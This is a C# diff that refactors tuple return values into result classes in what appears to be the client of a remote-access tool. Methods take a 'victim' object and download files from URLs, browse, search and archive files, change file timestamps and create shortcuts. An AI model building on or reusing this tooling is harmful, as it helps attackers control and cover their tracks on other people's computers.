@@ -59,7 +59,7 @@ namespace winClient48
         /// </summary>
         /// <param name="szDirPath">Destination directory path.</param>
         /// <returns></returns>
-        public (int, string) Goto(string szDirPath)
+        public clsRetValue Goto(string szDirPath)
         {
             int code = 1;
             string msg = string.Empty;
@@ -77,7 +77,11 @@ namespace winClient48
                 msg = ex.Message;
             }
 
-            return (code, msg);
+            return new clsRetValue
+            {
+                nCode = code,
+                szMsg = msg
+            };
         }
 
         /// <summary>
@@ -87,7 +91,7 @@ namespace winClient48
         /// <param name="dir_limit">Maximum count of directory.</param>
         /// <param name="file_limit">Maximum count of files.</param>
         /// <returns></returns>
-        public (int, string, List<string[]>, List<string[]>, int nTotalDir, int nTotalFile) ScanDir(string path, int dir_limit, int file_limit)
+        public clsRetScanDir ScanDir(string path, int dir_limit, int file_limit)
         {
             List<string[]> l_dir = new List<string[]>();
             List<string[]> l_file = new List<string[]>();
@@ -164,13 +168,29 @@ namespace winClient48
                         break;
                 }
 
-                return (code, string.Empty, l_dir, l_file, nTotalDir, nTotalFile);
+                return new clsRetScanDir
+                {
+                    nCode = code,
+                    szMsg = string.Empty,
+                    lsDir = l_dir,
+                    lsFile = l_file,
+                    nTotalDir = nTotalDir,
+                    nTotalFile = nTotalFile,
+                };
             }
             catch (Exception ex)
             {
                 code = 0;
 
-                return (code, ex.Message, l_dir, l_file, nTotalDir, nTotalFile);
+                return new clsRetScanDir
+                {
+                    nCode = code,
+                    szMsg = ex.Message,
+                    lsDir = l_dir,
+                    lsFile = l_file,
+                    nTotalDir = nTotalDir,
+                    nTotalFile = nTotalFile,
+                };
             }
         }
 
@@ -342,7 +362,7 @@ namespace winClient48
             }
         }
 
-        public (int, string, string) Wget(clsVictim v, string url, string szCurrentDir)
+        public clsRetFileWget Wget(clsVictim v, string url, string szCurrentDir)
         {
             int code = 1;
             string msg = string.Empty;
@@ -388,7 +408,7 @@ namespace winClient48
                 code = 0;
             }
 
-            return (code, msg, szSaveFileName);
+            return new clsRetFileWget { nCode = code, szMsg = msg, szSaveFileName = szSaveFileName };
         }
 
         public List<string> ShowImage(clsVictim v, string data)
@@ -412,7 +432,7 @@ namespace winClient48
             return b64_imgs;
         }
 
-        public (List<string[]>, List<string[]>) Archive_Compress(string[] folders, string[] files, string archive_path)
+        public clsRetFileArchiveCompress Archive_Compress(string[] folders, string[] files, string archive_path)
         {
             List<string[]> infoFolder = new List<string[]>();
             List<string[]> infoFile = new List<string[]>();
@@ -494,7 +514,7 @@ namespace winClient48
                 MessageBox.Show(ex.Message);
             }
 
-            return (infoFolder, infoFile);
+            return new clsRetFileArchiveCompress { lsFolderInfo = infoFolder, lsFileInfo = infoFile };
         }
         public List<string[]> Archive_Extract(string[] archives, string dstDir, int method, bool delete = false)
         {
@@ -647,7 +667,7 @@ namespace winClient48
 
             return result;
         }
-        public List<(string, string)> Find(string[] paths, string[] patterns, int method, bool ignoreCase, int itemType)
+        public List<clsRetFileFind> Find(string[] paths, string[] patterns, int method, bool ignoreCase, int itemType)
         {
             //Method: 0: File/Folder Name Only, 1: FullPath
             //ItemType: 0: Folder, 1: File, 2: All
@@ -665,7 +685,7 @@ namespace winClient48
                 }
             }
 
-            List<(string, string)> results = new List<(string, string)>();
+            List<clsRetFileFind> results = new List<clsRetFileFind>();
             foreach (string path in paths)
             {
                 if (!Directory.Exists(path))
@@ -679,7 +699,7 @@ namespace winClient48
                         foreach (string pattern in patterns)
                         {
                             if (Regex.IsMatch(input, @pattern, ignoreCase ? RegexOptions.IgnoreCase : RegexOptions.None))
-                                results.Add(("d", folderPath));
+                                results.Add(new clsRetFileFind { szType = "d", szPath = folderPath });
                         }
 
                         //Recurrence
@@ -695,7 +715,7 @@ namespace winClient48
                         foreach (string pattern in patterns)
                         {
                             if (Regex.IsMatch(input, @pattern, ignoreCase ? RegexOptions.IgnoreCase : RegexOptions.None))
-                                results.Add(("f", filePath));
+                                results.Add(new clsRetFileFind { szType = "f", szPath = filePath });
                         }
                     }
                 }
@@ -704,7 +724,7 @@ namespace winClient48
             return results;
         }
 
-        public (int nCode, string szMsg) fnSetEntityTimestamp(bool bIsFile, string szEntityPath, EntityTimestampType etType, DateTime date)
+        public clsRetValue fnSetEntityTimestamp(bool bIsFile, string szEntityPath, EntityTimestampType etType, DateTime date)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -740,10 +760,10 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
-        public (int nCode, string szMsg) fnCreateShortCuts(ShortCutsType scType, string szSrc, string szDestPath, string szDescription)
+        public clsRetValue fnCreateShortCuts(ShortCutsType scType, string szSrc, string szDestPath, string szDescription)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -787,7 +807,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
     }
 }
